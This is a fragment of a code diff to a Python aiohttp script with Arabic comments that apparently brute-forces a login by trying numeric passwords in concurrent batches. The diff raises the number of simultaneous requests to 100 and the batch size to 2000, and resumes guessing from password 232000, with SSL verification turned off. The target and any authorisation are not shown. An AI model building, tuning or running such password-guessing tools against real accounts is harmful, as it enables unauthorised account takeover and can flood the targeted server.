@@ -19,8 +19,8 @@ BASE_DATA = {
 }
 
 # 🔹 إعدادات السرعة (يمكنك تعديلها)
-CONCURRENCY_LIMIT = 50  # عدد الطلبات التي سيتم إرسالها معاً في نفس اللحظة
-CHUNK_SIZE = 1000       # عدد المحاولات في كل دفعة
+CONCURRENCY_LIMIT = 100  # عدد الطلبات التي سيتم إرسالها معاً في نفس اللحظة
+CHUNK_SIZE = 2000       # عدد المحاولات في كل دفعة
 
 async def attempt_login(session, password, semaphore, stop_event):
     """دالة فحص كلمة مرور واحدة"""
@@ -55,7 +55,7 @@ async def main():
     connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY_LIMIT)
     
     async with aiohttp.ClientSession(connector=connector) as session:
-        current_pass = 0
+        current_pass = 232000
         
         while not stop_event.is_set():
             print(f"🔄 جاري فحص الدفعة من {current_pass} إلى {current_pass + CHUNK_SIZE - 1}...")
